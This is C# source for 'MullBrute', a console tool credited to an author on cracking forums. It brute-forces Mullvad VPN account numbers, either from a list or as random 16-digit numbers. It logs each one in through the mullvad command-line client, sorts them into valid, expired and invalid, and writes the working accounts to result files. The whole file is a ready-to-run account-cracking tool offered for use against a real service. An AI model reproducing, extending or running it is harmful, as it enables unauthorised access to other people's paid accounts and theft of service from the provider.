using MullBrute;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

class Program
{
    /*

    [🎔] Made By: Kap0ne [🎔]
    [🎔] Made By: Kap0ne [🎔]
    [🎔] Made By: Kap0ne [🎔]
    [🎔] Made By: Kap0ne [🎔]
    [🎔] Made By: Kap0ne [🎔]
    [🎔] Made By: Kap0ne [🎔]
    [🎔] Made By: Kap0ne [🎔]
    [🎔] Made By: Kap0ne [🎔]
    [🎔] Made By: Kap0ne [🎔]
    [🎔] Made By: Kap0ne [🎔]

    */

    // [↓↓] Customization Settings [↓↓]

    public static string consoleTitle = Colorful.Console.Title = "[ MullBrute ] ~ Mullvad VPN Checker + Generator ~ Made By: Kap0ne";
    public static Color colorTheme = Color.FromArgb(0, 41, 81, 124);
    static string fancyText = "\n\r\n\r\n▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▌\r\n▐  ███▄ ▄███▓    █    ██     ██▓        ██▓        ▄▄▄▄       ██▀███      █    ██    ▄▄▄█████▓   ▓█████  ▌\r\n▐ ▓██▒▀█▀ ██▒    ██  ▓██▒   ▓██▒       ▓██▒       ▓█████▄    ▓██ ▒ ██▒    ██  ▓██▒   ▓  ██▒ ▓▒   ▓█   ▀  ▌\r\n▐ ▓██    ▓██░   ▓██  ▒██░   ▒██░       ▒██░       ▒██▒ ▄██   ▓██ ░▄█ ▒   ▓██  ▒██░   ▒ ▓██░ ▒░   ▒███    ▌\r\n▐ ▒██    ▒██    ▓▓█  ░██░   ▒██░       ▒██░       ▒██░█▀     ▒██▀▀█▄     ▓▓█  ░██░   ░ ▓██▓ ░    ▒▓█  ▄  ▌\r\n▐ ▒██▒   ░██▒   ▒▒█████▓    ░██████▒   ░██████▒   ░▓█  ▀█▓   ░██▓ ▒██▒   ▒▒█████▓      ▒██▒ ░    ░▒████▒ ▌\r\n▐ ░ ▒░   ░  ░   ░▒▓▒ ▒ ▒    ░ ▒░▓  ░   ░ ▒░▓  ░   ░▒▓███▀▒   ░ ▒▓ ░▒▓░   ░▒▓▒ ▒ ▒      ▒ ░░      ░░ ▒░ ░ ▌\r\n▐ ░  ░      ░   ░░▒░ ░ ░    ░ ░ ▒  ░   ░ ░ ▒  ░   ▒░▒   ░      ░▒ ░ ▒░   ░░▒░ ░ ░        ░        ░ ░  ░ ▌\r\n▐ ░      ░       ░░░ ░ ░      ░ ░        ░ ░       ░    ░      ░░   ░     ░░░ ░ ░      ░            ░    ▌\r\n▐        ░         ░            ░  ░       ░  ░    ░            ░           ░                       ░  ░ ▌\r\n▐                                                       ░                                                ▌\r\n▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌\r\n\r\n";
    public static string creditsText = "https://cracked.sh/Kap0ne / https://voided.to/User-Kap0ne";
    public static Color mainTextColor = Color.White;

    // [↑↑] Customization Settings [↑↑]

    static void DisplayWelcome()
    {
        string leftBracket = "[ ";
        string rightBracket = " ]";
        string[] lines = fancyText.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
        int consoleWidth = Colorful.Console.WindowWidth;
        int startRow = 0;

        Colorful.Console.Title = consoleTitle;
        Colorful.Console.ForegroundColor = colorTheme;

        foreach (string line in lines)
        {
            int startCol = Math.Max((consoleWidth - line.Length) / 2, 0);

            Colorful.Console.SetCursorPosition(startCol, startRow++);
            Colorful.Console.WriteLine(line, Color.FromArgb(0, 253, 210, 33));
        }

        Colorful.Console.WriteLine("");

        int totalLength = leftBracket.Length + creditsText.Length + rightBracket.Length;
        int leftPadding = (consoleWidth - totalLength) / 2;
        int rightPadding = consoleWidth - totalLength - leftPadding;

        Colorful.Console.Write(new string(' ', leftPadding), colorTheme);
        Colorful.Console.Write(leftBracket, colorTheme);

        Colorful.Console.Write(creditsText, mainTextColor);

        Colorful.Console.Write(rightBracket, colorTheme);
        Colorful.Console.Write(new string(' ', rightPadding), colorTheme);

        Colorful.Console.WriteLine("\n\n\n");
    }

    static void InitializeConsole()
    {
        WindowUtility.SetConsoleWindowPosition(WindowUtility.AnchorWindow.Center);
        DisplayWelcome();

        Colorful.Console.Write("[!] ", colorTheme);
        Colorful.Console.WriteLine("Choose an option:\n", mainTextColor);

        Colorful.Console.Write("[1] ", colorTheme);
        Colorful.Console.WriteLine("Check from 'Accounts.txt'", mainTextColor);

        Colorful.Console.Write("[2] ", colorTheme);
        Colorful.Console.WriteLine("Generate and check", mainTextColor);

        Colorful.Console.Write("[3] ", colorTheme);
        Colorful.Console.WriteLine("Exit\n", mainTextColor);

        Colorful.Console.Write("[→] ", colorTheme);
        Colorful.Console.Write("Enter your choice (1, 2, or 3): ", mainTextColor);
    }

    static Tuple<string, bool> RunMullvadCommand(string command)
    {
        try
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "mullvad";
                process.StartInfo.Arguments = command;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                string output = process.StandardOutput.ReadToEnd();

                process.WaitForExit();

                return Tuple.Create(output, true);
            }
        }

        catch (Exception e)
        {
            return Tuple.Create(e.Message, false);
        }
    }

    static bool IsExpirationInFuture(string expiryDateStr)
    {
        try
        {
            DateTimeOffset expirationDateOffset = DateTimeOffset.ParseExact(expiryDateStr, "yyyy-MM-dd HH:mm:ss zzz", System.Globalization.CultureInfo.InvariantCulture);
            DateTime expirationDateUTC = expirationDateOffset.UtcDateTime;
            DateTime currentTime = DateTime.UtcNow;

            return expirationDateUTC > currentTime;
        }

        catch (Exception)
        {
            return false;
        }
    }

    static Tuple<int, int, int> LoginAndGetAccountInfo(string accountNumber, int invalid, int valid, int expired, List<string> validAccounts, List<string> expiredAccounts)
    {
        var loginResult = RunMullvadCommand($"account login {accountNumber}");
        string loginOutput = loginResult.Item1;
        bool success = loginResult.Item2;

        if (success && loginOutput.Contains($"Mullvad account \"{accountNumber}\" set"))
        {
            var accountInfoResult = RunMullvadCommand("account get");
            string accountInfo = accountInfoResult.Item1;

            success = accountInfoResult.Item2;

            if (success)
            {
                Match expiryMatch = Regex.Match(accountInfo, @"Expires at\s*:\s*(.+)");

                if (expiryMatch.Success)
                {
                    string expirationDateString = expiryMatch.Groups[1].Value.Trim();

                    if (IsExpirationInFuture(expirationDateString))
                    {
                        validAccounts.Add($"{accountNumber} | Active: True | Expiration Date: {expirationDateString}");

                        Colorful.Console.Write("[VALID] ", Color.LimeGreen);
                        Colorful.Console.WriteLine($"{accountNumber}", Color.LimeGreen);

                        valid++;
                    }

                    else
                    {
                        expiredAccounts.Add($"{accountNumber} | Active: False | Expiration Date: {expirationDateString}");

                        Colorful.Console.Write("[EXPIRED] ", Color.FromArgb(0, 253, 210, 33));
                        Colorful.Console.WriteLine($"{accountNumber}", Color.FromArgb(0, 253, 210, 33));

                        expired++;
                    }
                }
            }
        }

        else
        {
            Colorful.Console.Write("[INVALID] ", Color.Red);
            Colorful.Console.WriteLine($"{accountNumber}", Color.Red);

            invalid++;
        }

        return Tuple.Create(invalid, valid, expired);
    }

    static Tuple<int, int, int> FileInput(int invalid, int valid, int expired, List<string> validAccounts, List<string> expiredAccounts)
    {
        try
        {
            if (!File.Exists("Accounts/Accounts.txt"))
            {
                File.Create("Accounts/Accounts.txt").Close();
            }

            string[] lines = File.ReadAllLines("Accounts/Accounts.txt");

            foreach (string line in lines)
            {
                string accountNumber = line.Trim();

                if (!string.IsNullOrEmpty(accountNumber))
                {
                    var result = LoginAndGetAccountInfo(accountNumber, invalid, valid, expired, validAccounts, expiredAccounts);

                    invalid = result.Item1;
                    valid = result.Item2;
                    expired = result.Item3;

                    Thread.Sleep(250);
                }
            }
        }

        catch (Exception fileInputException)
        {
            Colorful.Console.Write("[ERROR] ", Color.Red);
            Colorful.Console.WriteLine($"{fileInputException.Message}\n", Color.Red);

            Colorful.Console.Write("[→] ", colorTheme);
            Colorful.Console.Write("Press any key to exit...", mainTextColor);

            Colorful.Console.ReadKey();
            Environment.Exit(0);
        }

        return Tuple.Create(invalid, valid, expired);
    }

    static Tuple<int, int, int> GenerateAccounts(int invalid, int valid, int expired, List<string> validAccounts, List<string> expiredAccounts)
    {
        Colorful.Console.Write("[→] ", colorTheme);
        Colorful.Console.Write("Enter the number of accounts to generate: ", mainTextColor);

        Colorful.Console.ForegroundColor = mainTextColor;

        if (!int.TryParse(Colorful.Console.ReadLine(), out int count))
        {
            Colorful.Console.Write("\n[ERROR] ", Color.Red);
            Colorful.Console.WriteLine("Invalid number!\n", Color.Red);

            Colorful.Console.Write("[→] ", colorTheme);
            Colorful.Console.Write("Press any key to exit...", mainTextColor);

            Colorful.Console.ReadKey();
            Environment.Exit(0);
        }

        Colorful.Console.Write("\n");

        Random random = new Random();

        for (int i = 0; i < count; i++)
        {
            string accountNumber = new string(Enumerable.Range(0, 16).Select(_ => (char)('0' + random.Next(10))).ToArray());
            var result = LoginAndGetAccountInfo(accountNumber, invalid, valid, expired, validAccounts, expiredAccounts);

            invalid = result.Item1;
            valid = result.Item2;
            expired = result.Item3;

            Thread.Sleep(250);
        }

        return Tuple.Create(invalid, valid, expired);
    }

    static void Main(string[] args)
    {
        try
        {
            string[] requiredFiles =
            {
                "Accounts/Accounts.txt",
                "Results/Valid.txt",
                "Results/Expired.txt"
            };

            foreach (string file in requiredFiles)
            {
                if (!File.Exists(file))
                {
                    File.Create(file).Close();
                }
            }
        }

        catch (Exception fileCreationException)
        {
            Colorful.Console.Write("[ERROR] ", Color.Red);
            Colorful.Console.WriteLine($"Failed to create files: {fileCreationException.Message}\n", Color.Red);

            Colorful.Console.Write("[→] ", colorTheme);
            Colorful.Console.Write("Press any key to exit...", mainTextColor);

            Colorful.Console.ReadKey();
            Environment.Exit(0);
        }

        InitializeConsole();

        Colorful.Console.OutputEncoding = Encoding.UTF8;
        Colorful.Console.ForegroundColor = mainTextColor;

        string choice = Colorful.Console.ReadLine();
        int invalid = 0, valid = 0, expired = 0;
        List<string> validAccounts = new List<string>();
        List<string> expiredAccounts = new List<string>();

        Colorful.Console.Clear();
        DisplayWelcome();

        switch (choice)
        {
            case "1":

                var result1 = FileInput(invalid, valid, expired, validAccounts, expiredAccounts);

                invalid = result1.Item1;
                valid = result1.Item2;
                expired = result1.Item3;

                break;

            case "2":

                var result2 = GenerateAccounts(invalid, valid, expired, validAccounts, expiredAccounts);

                invalid = result2.Item1;
                valid = result2.Item2;
                expired = result2.Item3;

                break;

            case "3":

                Environment.Exit(0);

                break;

            default:

                Colorful.Console.Write("[ERROR] ", Color.Red);
                Colorful.Console.WriteLine("Invalid choice!\n", Color.Red);

                Colorful.Console.Write("[→] ", colorTheme);
                Colorful.Console.Write("Press any key to exit...", mainTextColor);

                Colorful.Console.ReadKey();

                return;
        }

        try
        {
            File.WriteAllLines("Results/Valid.txt", validAccounts);
            File.WriteAllLines("Results/Expired.txt", expiredAccounts);
        }

        catch (Exception fileWritingException)
        {
            Colorful.Console.WriteLine("");

            Colorful.Console.Write("[ERROR] ", Color.Red);
            Colorful.Console.WriteLine($"{fileWritingException.Message}\n", Color.Red);

            Colorful.Console.Write("[→] ", colorTheme);
            Colorful.Console.Write("Press any key to exit...", mainTextColor);

            Colorful.Console.ReadKey();

            return;
        }

        if (validAccounts.Count > 0)
        {
            Colorful.Console.WriteLine("");

            Colorful.Console.Write("[!] ", colorTheme);
            Colorful.Console.WriteLine("Valid accounts from this run:\n", mainTextColor);

            foreach (string account in validAccounts)
            {
                Colorful.Console.Write("[VALID] ", Color.LimeGreen);
                Colorful.Console.WriteLine(account, Color.LimeGreen);
            }
        }

        if (expiredAccounts.Count > 0)
        {
            Colorful.Console.WriteLine("");

            Colorful.Console.Write("[!] ", colorTheme);
            Colorful.Console.WriteLine("Expired accounts from this run:\n", mainTextColor);

            foreach (string account in expiredAccounts)
            {
                Colorful.Console.Write("[EXPIRED] ", Color.FromArgb(0, 253, 210, 33));
                Colorful.Console.WriteLine(account, Color.FromArgb(0, 253, 210, 33));
            }
        }

        int loaded = invalid + valid + expired;

        Colorful.Console.WriteLine("");

        Colorful.Console.Write("[!] ", colorTheme);
        Colorful.Console.WriteLine("Completed!\n", mainTextColor);

        Colorful.Console.Write("[!] ", colorTheme);
        Colorful.Console.WriteLine($"Loaded: {loaded}", mainTextColor);

        Colorful.Console.Write("[!] ", colorTheme);
        Colorful.Console.Write("Valid: ", mainTextColor);
        Colorful.Console.WriteLine($"{valid}", Color.LimeGreen);

        Colorful.Console.Write("[!] ", colorTheme);
        Colorful.Console.Write("Expired: ", mainTextColor);
        Colorful.Console.WriteLine($"{expired}", Color.FromArgb(0, 253, 210, 33));

        Colorful.Console.Write("[!] ", colorTheme);
        Colorful.Console.Write("Invalid: ", mainTextColor);
        Colorful.Console.WriteLine($"{invalid}\n", Color.Red);

        Colorful.Console.Write("[→] ", colorTheme);
        Colorful.Console.Write("Press any key to exit...", mainTextColor);

        Colorful.Console.ReadKey();
    }
}